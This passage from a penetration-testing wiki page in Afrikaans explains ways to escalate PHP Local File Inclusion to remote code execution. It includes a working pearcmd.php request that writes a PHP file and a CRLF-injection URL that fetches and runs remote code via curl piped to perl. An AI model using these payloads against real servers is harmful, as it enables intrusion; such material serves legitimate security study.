Soos [**verduidelik in hierdie pos**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), bestaan die skrip `/usr/local/lib/phppearcmd.php` standaard in php docker beelde. Boonop is dit moontlik om argumente aan die skrip deur die URL te gee omdat dit aangedui word dat as 'n URL parameter nie 'n `=` het nie, dit as 'n argument gebruik moet word.

Die volgende versoek skep 'n lêer in `/tmp/hello.php` met die inhoud `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Die volgende misbruik 'n CRLF kwesbaarheid om RCE te verkry (van [**hier**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

As jy 'n **Local File Inclusion** gevind het en 'n lêer wat **phpinfo()** blootstel met file_uploads = on, kan jy RCE kry:

{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Pad Ontsluiting

As jy 'n **Local File Inclusion** gevind het en jy **kan die pad** van die tydelike lêer **uitvoer**, MAAR die **bediener** is **besig** om te kyk of die **lêer wat ingesluit moet word PHP merke het**, kan jy probeer om daardie **kontrole te omseil** met hierdie **Race Condition**:

{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via ewige wag + bruteforce

As jy die LFI kan misbruik om **tydelike lêers op te laai** en die bediener kan die PHP-uitvoering **hang**, kan jy dan **brute force lêernames oor ure** om die tydelike lêer te vind:

{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Tot Fatale Fout

As jy enige van die lêers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` insluit. (Jy moet dieselfde een 2 keer insluit om daardie fout te veroorsaak).

**Ek weet nie hoe dit nuttig is nie, maar dit mag wees.**\
_Alhoewel jy 'n PHP Fatale Fout veroorsaak, word PHP tydelike lêers wat opgelaai is, verwyder._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Verwysings

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
